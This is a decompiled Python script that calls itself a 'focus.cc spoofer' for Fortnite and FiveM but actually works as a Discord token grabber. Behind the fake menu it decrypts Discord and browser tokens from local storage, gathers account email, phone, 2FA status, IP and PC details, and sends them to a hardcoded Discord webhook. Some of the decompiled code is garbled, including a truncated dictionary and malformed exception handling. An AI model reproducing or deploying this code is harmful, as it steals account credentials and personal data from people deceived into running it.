# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: spoofercompiled.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import time
import colorama
from colorama import Fore
os.system('title focus.exe')
os.system('chcp 65001 >nul')
os.system('mode con: cols=85 lines=30')
print('')
print('')
print('')
print(f'{Fore.RED}                             ·▄▄▄       ▄▄· ▄• ▄▌.▄▄ ·  ')
print(f'{Fore.RED}                             ▐▄▄·▪     ▐█ ▌▪█▪██▌▐█ ▀.  ')
print(f'{Fore.RED}                             ██▪  ▄█▀▄ ██ ▄▄█▌▐█▌▄▀▀▀█▄ ')
print(f'{Fore.RED}                             ██▌.▐█▌.▐▌▐███▌▐█▄█▌▐█▄▪▐█ ')
print(f'{Fore.RED}                             ▀▀▀  ▀█▄▀▪·▀▀▀  ▀▀▀  ▀▀▀▀  ')
print('')
print('      ╔════════════════════════════════════════════════════════════════════╗')
print('      ║                    focus.cc spoofer v1 by qvelo4                   ║')
print('      ╚════════════════════════════════════════════════════════════════════╝')
print('')
print(f'{Fore.WHITE}  [1]  -  Spoof Fortnite \n  [2]  -  Spoof FiveM\n  [+]  -  Choice : ')
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
import os
from datetime import datetime
tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:(-16)].decode()
    except:
        return 'Error'

def getip():
    ip = 'None'
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
        return ip
    except:
        pass
        return ip

def gethwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + '\\Google\\Chrome\\User Data'
    paths = {'Discord': roaming + '\\discord', 'Discord Canary': roaming + '\\discordcanary', 'Lightcord': roaming + '\\Lightcord', 'Discord PTB': roaming + '\\discordptb', 'Opera': roaming + '\\Opera Software\\Opera Stable', 'Opera GX': roaming + '\\Opera Software\\Opera GX Stable', 'Amigo': local + '\\Amigo\\User Data', 'Torch': local + '\\Torch\\User Data', 'Kometa': local + '\\Kometa\\User Data', 'Orbitum': local + '\\Orbitum\\User Data', 'CentBrowser': local + '\\CentBrowser\\User Data', '7Star': local + '\\7Star\\7Star\\User Data', 'Sputnik': local + '\\Sputnik\\Sputnik\\User Data', 'Vivaldi': local + '\\Vivaldi\\User Data\\Default', 'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data', 'Chrome': chrome + 'Default', 'Epic Privacy Browser': local + '\\Microsoft\\Edge\\User Data\\Defaul', '\\uCozMedia\\Uran\\User Data\\Default': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            with open(path + '\\Local State', 'r') as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except:
            continue
        for file in listdir(path + '\\Local Storage\\leveldb\\'):
            if not file.endswith('.ldb') and file.endswith('.log'):
                continue
            try:
                with open(path + f'\\Local Storage\\leveldb\\{file}', 'r', errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\\"]*', x):
                            tokens.append(values)
            except PermissionError:
                continue
        for i in tokens:
            if i.endswith('\\'):
                i.replace('\\', '')
            else:  # inserted
                if i not in cleaned:
                    cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == 'Error':
                continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except:
                        continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv('UserName')
                        pc_name = os.getenv('COMPUTERNAME')
                        user_name = f"{res_json['username']}#{res_json['discriminator']}"
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                            d2 = datetime.strptime(nitro_data[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                            days_left = abs((d2 - d1).days)
                        embed = f"**{user_name}** *({user_id})*\n\n> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{(days_left if days_left else 'None')} day(s)`\n\n> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n\n> :piñata: __Token__\n\t`{tok}`\n\n*Made by Astraa#6100* **|** ||https://github.com/astraadev||"
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                            req = Request('https://canary.discord.com/api/webhooks/1307757065141489754/XXripIz79nYjJ6iCom-VYPdBpx7xiA6GmS_VPxQc8prIN_Pfya79duwHbqP9065vXdoN', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except:
                            continue
if __name__ == '__main__':
    get_token()
time.sleep(120)